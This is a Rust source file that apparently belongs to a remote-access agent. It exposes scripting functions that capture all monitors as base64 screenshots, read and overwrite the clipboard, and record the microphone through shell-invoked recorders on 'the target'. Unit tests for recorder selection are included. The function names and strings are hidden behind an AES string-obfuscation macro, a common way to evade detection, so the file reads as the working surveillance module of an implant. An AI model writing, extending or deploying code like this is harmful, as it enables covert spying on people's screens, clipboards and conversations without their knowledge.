// src/agent/scripting/media.rs
use rhai::Engine;
use std::{fs, io::Cursor, time::Duration};
#[cfg(not(target_env = "musl"))]
use screenshots::Screen;
use image::ImageOutputFormat;
#[cfg(not(target_env = "musl"))]
use arboard::Clipboard;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use crate::utils;
use crate::strcrypt_rt;
use strcrypt::aes_str;

// ── Microphone recorder selection ───────────────────────────────────────
// Stock targets often lack arecord/ffmpeg/sox, so the recorder binary is
// probed at call time instead of hardcoded per OS, the capture file uses
// a randomized temp name (the old fixed rcm_mic.wav was predictable), and
// a missing recorder is an honest error rather than a silent failure.

/// Candidate recorder binaries per OS, in order of preference.
pub fn recorder_candidates(os: &str) -> &'static [&'static str] {
    match os {
        "linux"   => &["arecord", "sox", "ffmpeg"],
        "windows" => &["ffmpeg", "sox"],
        "macos"   => &["sox", "ffmpeg"],
        _         => &[],
    }
}

/// First preferred recorder the `available` probe finds, if any.
pub fn pick_recorder(os: &str, available: impl Fn(&str) -> bool) -> Option<&'static str> {
    recorder_candidates(os).iter().copied().find(|b| available(b))
}

/// True when `name` resolves to a file on PATH (PATHEXT-aware on Windows).
fn binary_on_path(name: &str) -> bool {
    let path_var = std::env::var("PATH").unwrap_or_default();
    std::env::split_paths(&path_var).any(|dir| {
        if dir.join(name).is_file() {
            return true;
        }
        #[cfg(windows)]
        {
            let exts = std::env::var("PATHEXT")
                .unwrap_or_else(|_| ".COM;.EXE;.BAT;.CMD".to_string());
            for ext in exts.split(';') {
                if dir.join(format!("{}{}", name, ext)).is_file() {
                    return true;
                }
            }
        }
        false
    })
}

/// Recorder-specific capture command line producing WAV at `tmp`.
pub fn record_command(recorder: &str, os: &str, secs: i64, tmp: &str) -> String {
    match recorder {
        "arecord" => format!("arecord -f cd -t wav -d {} {:?} 2>/dev/null", secs, tmp),
        "sox"     => format!("sox -d -t wav {:?} trim 0 {} 2>/dev/null", tmp, secs),
        "ffmpeg" if os == "windows" => format!("ffmpeg -f dshow -i audio=default -t {} {:?} -y 2>$null", secs, tmp),
        "ffmpeg" if os == "macos"   => format!("ffmpeg -f avfoundation -i ':0' -t {} {:?} -y 2>/dev/null", secs, tmp),
        "ffmpeg"  => format!("ffmpeg -f alsa -i default -t {} {:?} -y 2>/dev/null", secs, tmp),
        _         => String::new(),
    }
}

/// Randomized temp WAV path for one capture.
pub fn mic_temp_path() -> std::path::PathBuf {
    std::env::temp_dir().join(format!("rcm_mic_{:08x}.wav", rand::random::<u32>()))
}

pub fn register(engine: &mut Engine) {

    // ── Screenshot ────────────────────────────────────────────────────────────
    // Returns a JSON array: [{monitor_index, width, height, b64}]

#[cfg(not(target_env = "musl"))]
    engine.register_fn(&aes_str!("internal_screenshot"), || -> String {
        let screens  = Screen::all().unwrap_or_default();
        let mut results = Vec::new();
        for (i, screen) in screens.iter().enumerate() {
            if let Ok(image) = screen.capture() {
                let mut cursor = Cursor::new(Vec::new());
                if image.write_to(&mut cursor, ImageOutputFormat::Png).is_ok() {
                    let b64 = BASE64.encode(cursor.get_ref());
                    results.push(serde_json::json!({
                        aes_str!("monitor_index").as_str(): i,
                        aes_str!("width").as_str():  screen.display_info.width,
                        aes_str!("height").as_str(): screen.display_info.height,
                        aes_str!("b64").as_str():    b64,
                    }));
                }
            }
        }
        serde_json::to_string(&results).unwrap_or("[]".into())
    });
    #[cfg(target_env = "musl")]
    engine.register_fn(&aes_str!("internal_screenshot"), || -> String {
        // X11 capture is not available in fully-static musl builds.
        serde_json::to_string(&Vec::<serde_json::Value>::new()).unwrap_or("[]".into())
    });


    // ── Clipboard ─────────────────────────────────────────────────────────────

#[cfg(not(target_env = "musl"))]
    engine.register_fn(&aes_str!("internal_clipboard_get"), || -> String {
        match Clipboard::new() {
            Ok(mut cb) => cb.get_text().unwrap_or_else(|e| format!("{}{}", aes_str!("[Empty/Image] "), e)),
            Err(e)     => format!("{}{}", aes_str!("Clipboard Init Error: "), e),
        }
    });

    #[cfg(target_env = "musl")]
    engine.register_fn(&aes_str!("internal_clipboard_get"), || -> String {
        aes_str!("unavailable on this build").into()
    });


#[cfg(not(target_env = "musl"))]
    engine.register_fn(&aes_str!("internal_clipboard_set"), |text: &str| -> String {
        match Clipboard::new() {
            Ok(mut cb) => match cb.set_text(text) {
                Ok(_)  => aes_str!("Success"),
                Err(e) => format!("{}{}", aes_str!("Set Error: "), e),
            },
            Err(e) => format!("{}{}", aes_str!("Clipboard Init Error: "), e),
        }
    });

    #[cfg(target_env = "musl")]
    engine.register_fn(&aes_str!("internal_clipboard_set"), |_text: &str| -> String {
        aes_str!("unavailable on this build")
    });


#[cfg(not(target_env = "musl"))]
    engine.register_fn(&aes_str!("internal_clipboard_clear"), || -> String {
        match Clipboard::new() {
            Ok(mut cb) => match cb.clear() {
                Ok(_)  => aes_str!("Clipboard Cleared"),
                Err(e) => format!("{}{}", aes_str!("Clear Error: "), e),
            },
            Err(e) => format!("{}{}", aes_str!("Clipboard Init Error: "), e),
        }
    });

    #[cfg(target_env = "musl")]
    engine.register_fn(&aes_str!("internal_clipboard_clear"), || -> String {
        aes_str!("unavailable on this build")
    });


    // ── Microphone ────────────────────────────────────────────────────────────
    // Shell-based recording - probes PATH for the first available recorder
    // (arecord/sox/ffmpeg, per-OS preference order). Returns base64 WAV on
    // success; an honest error when no recorder exists on the target.

    engine.register_fn(&aes_str!("internal_mic_record"), |seconds: i64| -> String {
        let secs = seconds.max(1).min(300);
        let os = std::env::consts::OS;
        let recorder = match pick_recorder(os, binary_on_path) {
            Some(r) => r,
            None => {
                return format!("{}{}{}",
                    aes_str!("Error: no supported audio recorder found on PATH (tried "),
                    recorder_candidates(os).join(", "),
                    aes_str!(")"));
            }
        };
        let tmp = mic_temp_path();
        let tmp_s = tmp.to_string_lossy().to_string();
        let record_cmd = record_command(recorder, os, secs, &tmp_s);

        let (out, err, code) = utils::execute_shell_command_timeout(
            &record_cmd,
            Duration::from_secs((secs + 15) as u64),
        );

        if code != 0 && tmp.metadata().map(|m| m.len()).unwrap_or(0) == 0 {
            return format!("{}{}): {} {}", aes_str!("Error: recording failed (exit "), code, out, err);
        }

        match fs::read(&tmp) {
            Ok(bytes) => { let _ = fs::remove_file(&tmp); BASE64.encode(&bytes) }
            Err(e)    => format!("{}{}", aes_str!("Error reading WAV: "), e),
        }
    });
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn recorder_candidates_per_os() {
        assert_eq!(recorder_candidates("linux"), &["arecord", "sox", "ffmpeg"]);
        assert_eq!(recorder_candidates("windows"), &["ffmpeg", "sox"]);
        assert_eq!(recorder_candidates("macos"), &["sox", "ffmpeg"]);
        assert!(recorder_candidates("freebsd").is_empty());
    }

    #[test]
    fn pick_recorder_prefers_order_and_probes() {
        // Only sox "available": probe must skip arecord and land on sox.
        let r = pick_recorder("linux", |b| b == "sox");
        assert_eq!(r, Some("sox"));
        // First candidate wins when everything is available.
        let r = pick_recorder("linux", |_| true);
        assert_eq!(r, Some("arecord"));
        // Nothing available: honest None, never a silent default.
        let r = pick_recorder("linux", |_| false);
        assert_eq!(r, None);
        // Unknown OS has no candidates at all.
        assert_eq!(pick_recorder("plan9", |_| true), None);
    }

    #[test]
    fn record_command_shapes() {
        assert!(record_command("arecord", "linux", 10, "/tmp/x.wav").starts_with("arecord -f cd -t wav -d 10 "));
        assert!(record_command("sox", "linux", 7, "/tmp/x.wav").contains("trim 0 7"));
        assert!(record_command("ffmpeg", "windows", 5, "C:\\t\\x.wav").contains("-f dshow"));
        assert!(record_command("ffmpeg", "macos", 5, "/tmp/x.wav").contains("avfoundation"));
        assert!(record_command("ffmpeg", "linux", 5, "/tmp/x.wav").contains("-f alsa"));
        assert!(record_command("unknown", "linux", 5, "/tmp/x.wav").is_empty());
    }

    #[test]
    fn mic_temp_path_is_randomized_in_temp_dir() {
        let p1 = mic_temp_path();
        let p2 = mic_temp_path();
        assert_ne!(p1, p2, "temp names must not be predictable");
        assert_eq!(p1.parent().unwrap(), std::env::temp_dir());
        assert!(p1.to_string_lossy().ends_with(".wav"));
    }
}
